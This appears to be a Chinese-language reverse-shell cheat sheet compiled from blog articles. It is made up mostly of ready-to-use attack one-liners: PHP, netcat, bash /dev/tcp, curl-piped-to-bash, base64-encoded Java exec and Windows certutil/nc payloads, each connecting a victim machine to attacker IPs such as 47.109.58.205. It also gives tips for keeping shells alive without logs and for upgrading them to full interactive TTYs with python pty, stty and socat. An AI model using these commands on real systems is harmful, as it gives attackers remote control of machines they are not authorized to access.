<https://cloud.tencent.com/developer/article/1818091>
反弹shell一篇够了<https://blog.csdn.net/mastergu2/article/details/120975065>

## **0x01.为什么要用反弹shell呢？**

反弹shell通常适用于如下几种情况：

•目标机因防火墙受限，目标机器只能发送请求，不能接收请求。
•目标机端口被占用。
•目标机位于局域网，或IP会动态变化，攻击机无法直接连接，使用反向连接来反弹shell。
•对于病毒，木马，受害者什么时候能中招，对方的网络环境是什么样的，什么时候开关机，都是未知的......

对于以上几种情况，我们是无法利用正向连接的，要用反向连接。

那么反向连接就很好理解了，就是攻击者指定服务端，受害者主机主动连接攻击者的服务端程序，即为反向连接。

反弹shell的方式有很多，那具体要用哪种方式还需要根据目标主机的环境来确定，比如目标主机上如果安装有netcat，那我们就可以利用netcat(nc)或ncat(nc升级版)反弹shell，如果具有python环境，那我们可以利用python反弹shell。如果具有php环境，那我们可以利用php反弹shell。
如
```
php -r '$sock=fsockopen("47.xxx.xxx.72",2333);exec("/bin/sh -i <&3 >&3 2>&3");'
```



## **0x02.利用netcat(nc)反弹shell**

Netcat 是一款简单的Unix工具，使用UDP和TCP协议。它是一个可靠的容易被其他程序所启用的后台操作工具，同时它也被用作网络的测试工具或黑客工具。使用它你可以轻易的建立任何连接。

目前，默认的各个linux发行版本已经自带了netcat工具包，但是可能由于处于安全考虑原生版本的netcat带有可以直接发布与反弹本地shell的功能参数 -e 都被阉割了，所以我们需要自己手动下载二进制安装包，安装的如下：

```
wget https://nchc.dl.sourceforge.net/project/netcat/netcat/0.7.1/netcat-0.7.1.tar.gztar -xvzf netcat-0.7.1.tar.gz./configuremake && make installmake clean
```
安装完原生版本的 netcat 工具后，便有了netcat -e参数，我们就可以将本地bash反弹到攻击机上了。

**攻击机开启本地监听：**
```
netcat -lvvp 2333
nc -lvvp 2333
```
**目标机主动连接攻击机：**
```
netcat 47.xxx.xxx.72 2333 -e /bin/bash
nc <攻击机IP> <攻击机监听的端口> -e /bin/bash
nc 1.92.88.247 2333  -e /bin/bash
```

## **0x03.利用Bash反弹shell**

反弹shell最好用的方法就是使用bash结合重定向方法的一句话，具体命令如下：
```
bash -i >& /dev/tcp/47.xxx.xxx.72/2333 0>&1
或bash -c "bash -i >& /dev/tcp/47.xxx.xxx.72/2333 0>&1"
```
以下是针对Bash反弹一句话进行了拆分说明：

| 命令                          | 命令详解                                                                               |
| --------------------- | ---------------------------------- |
| bash -i                     | 产生一个bash交互环境。                                                                      |
| >&                          | 将联合符号前面的内容与后面相结合，然后一起重定向给后者。                                                       |
| /dev/tcp/47.xxx.xxx.72/2333 | Linux环境中所有的内容都是以文件的形式存在的，其实大家一看见这个内容就能明白，就是让目标主机与攻击机47.xxx.xxx.72的2333端口建立一个tcp连接。 |
| 0>&1                        | 将标准输入与标准输出的内容相结合，然后重定向给前面标准输出的内容。                                                  |

Bash反弹一句完整的解读过程就是：

Bash产生了一个交互环境和本地主机主动发起与攻击机2333端口建立的连接（即TCP 2333会话连接）相结合，然后在重定向个TCP 2333会话连接，最后将用户键盘输入与用户标准输出相结合再次重定向给一个标准的输出，即得到一个Bash反弹环境。

**攻击机开启本地监听：**

```
netcat -lvvp 2333
nc -lvvp 2333
或者
ncat -lvp 2333
```

**目标机主动连接攻击机：**

```
bash -i >& /dev/tcp/47.109.58.205/2333 0>&1
```
**目标机借助Curl连接攻击机：**

```
curl http://47.109.58.205/fanshell.txt|bash

fanshell.txt内容为：
bash -i >& /dev/tcp/47.109.58.205/2333 0>&1
```


注意java这里反弹shell需要改良
```
Runtime.getRuntime().exec("bash -i >& /dev/tcp/ip/port 0>&1");

bash -i >& /dev/tcp/ip/port 0>&1 需要base64编码再执行下面：

bash -c {echo,YmFzaCAtaSA+Ji9kZXYvdGNwLzEyNy4wLjAuMS84ODg4IDA+JjE=}|{base64,-d}|{bash,-i}
```



## **0x04.目标机Windows主动连接攻击机**
windows下载nc.exe，或者ncat。
nc.exe下载：<https://eternallybored.org/misc/netcat/>，只需要nc.exe程序即可。
下载命令生成：<https://forum.ywhack.com/bountytips.php?download>
```
certutil.exe -urlcache -split -f http://xiaodi8.com:80/nc.exe nc.exe
```
windows反弹cmd
```
能出网的windows：
nc.exe -e cmd 47.109.58.205 2333
ncat -e cmd 47.109.58.205 2333
公网的47.109.58.205服务器：
ncat -lvvp 2333
```

正向shell连接
```
公网的目标windows:
c:\\nc.exe -e cmd -lvvp 2333
能出网的机子：
ncat 47.0.0.1 2333
```

^
## **反弹shell防断措施**
```
反弹端：nohup或screen后台弹
nohup /bin/bash -c "bash -i >& /dev/tcp/your_ip/your_port 0>&1"
nohup bash -i >& /dev/tcp/47.109.58.205/2333 0>&1

可以先反弹一个不稳定的shell，再反弹一个稳定的shell。



日志记录输出
nohup 命令 > myout.log 2>&1 &
nohup nc -lvvp 2333 > myout.log 2>&1 &

无日志
nohup 命令 2>&1 &
```

^
## **升级交互式shell**
/usr/bin/script -qc /bin/bash /dev/null

假设一个情况：如果当前拿到shell之后，我们想要使用vim、su或者想要tab补全代码、ctrl+c结束当前行代码、或者使用快捷键使用上一条命令，这个时候这个shell并不会对我们的操作进行响应，那么这个时候就需要升级shell成为交互式完美shell，使其跟我们常规命令行操作一样。

### 使用python pty
```
python -c 'import pty; pty.spawn("/bin/bash")'
```
```
python3 -c "__import__('subprocess').call(['/bin/bash'])"



```
但是当前情况还是不能补全代码，得用stty来进行优化，来转换成完美shell
在执行完python命令之后，按下Ctrl+z
```
Linux 中Ctrl + c/d/z 看着都差不多，但是还是有不一样的含义
Ctrl + c 强制中断程序的执行，进程终止
Ctrl + d 发送EOF信号，很多程序接到这个信号后会停止
Ctrl + z 将任务中止，其实就是将这个任务暂停
```
按下Ctrl+z之后，nc反弹的shell放入了后台，界面退回到了攻击主机原本的shell
- `echo $TERM` 获取 term值
- `stty -a` 获取 rows 和 columns 的值
- `stty raw -echo` 关闭输入回显
- `fg` 进入前台，就是把刚才中止的nc连接捡回来
- `reset`
- `export SHELL=bash`
- `export TERM=[前面获取的term值]`
- `stty [前面获取的rows和columns值]`
这一套在ios系统里面不起作用，但在kali当中时可以完全解决的。

### 升级nc为交互shell
老实话没有什么区别，就上面那样，一样的。
### 使用socat

[socat](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat) 是类Unix系统下的一个工具，可以看作是 nc 的加强版。我们可以使用socat来传递完整的带有tty的TCP连接。缺点也很明显，只能在linux下面运行。

攻击机：

```
# 首先安装
$ sudo apt install socat
# 执行
$ socat file:`tty`,raw,echo=0 tcp-listen:[port]
```

目标机：

```
# 把socat上传到目标机器上或者直接下载
$ wget https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat
# 运行
$ chmod +x /tmp/socat
$ /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:[host]:[port]
```

这种方式基本和ssh类似，ctrl+C也不会直接断开。

## script获取pty

我们可以使用 Linux 系统下的 `script` 命令，在弹回来的 shell 下创建一个带有 tty 的 shell, 这样就可以勉强使用一下 `top` 和 `vim`

```
script /dev/null
tty
```

如果不加 `/dev/null` 的话，会在当前路径下生成一个名字是 `typescript` 的文件，记录着在 script 生命周期里你执行的所有命令和结果。

demo:

```
C:\Users\
λ nc -lvvp 4444
listening on [any] 4444 ...
connect to [192.168.2.134] from DESKTOP-IBUUT6H.lan [192.168.2.134] 30567
ubuntu@ubuntu:~$ tty
tty
not a tty
ubuntu@ubuntu:~$ script /dev/null
script /dev/null
Script started, file is /dev/null
ubuntu@ubuntu:~$ tty
tty
/dev/pts/1
```
更好：/usr/bin/script -qc /bin/bash /dev/null